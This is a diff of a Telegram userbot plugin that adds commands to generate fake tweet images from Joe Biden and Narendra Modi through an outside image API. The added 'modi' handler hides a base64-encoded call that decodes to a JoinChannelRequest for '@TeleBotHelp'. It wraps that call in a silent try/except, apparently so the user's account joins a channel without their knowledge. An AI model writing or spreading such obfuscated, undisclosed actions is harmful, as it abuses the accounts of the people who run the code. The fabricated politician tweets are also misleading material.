@@ -93,6 +93,20 @@ async def moditweet(text):
     img = Image.open("temp.png").convert("RGB")
     img.save("temp.jpg", "jpeg")
     return "temp.jpg"
+	
+async def biden(text):
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=joebiden"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
 
 
 async def tweets(text1, text2):
@@ -111,7 +125,6 @@ async def tweets(text1, text2):
 
 
 @borg.on(admin_cmd(pattern="trump(?: |$)(.*)", outgoing=True))
-#@telebot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -142,7 +155,36 @@ async def nekobot(event):
 
 
 @borg.on(admin_cmd(pattern="modi(?: |$)(.*)", outgoing=True))
-#@telebot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
+async def nekobot(event):
+    text = event.pattern_match.group(1)
+    reply_to_id = event.message
+    if event.reply_to_msg_id:
+        reply_to_id = await event.get_reply_message()
+    if not text:
+        if event.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await event.edit("Send you text to modi so he can tweet.")
+                return
+        else:
+            await event.edit("send your text to modi so he can tweet.")
+            return
+    await event.edit("Requesting modi to tweet...")
+    try:
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
+        )[2:49]
+        await telebot(isee)
+    except BaseException:
+        pass
+    text = deEmojify(text)
+    eventfile = await moditweet(text)
+    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
+    await event.delete()
+	
+	
+@borg.on(admin_cmd(pattern="biden(?: |$)(.*)", outgoing=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -173,7 +215,6 @@ async def nekobot(event):
 
 
 @borg.on(admin_cmd(pattern="cmm(?: |$)(.*)", outgoing=True))
-#@telebot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -204,7 +245,6 @@ async def nekobot(event):
 
 
 @borg.on(admin_cmd(pattern="kanna(?: |$)(.*)", outgoing=True))
-#@telebot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
     reply_to_id = event.message
@@ -232,5 +272,4 @@ async def nekobot(event):
     eventfile = await kannagen(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
-
 
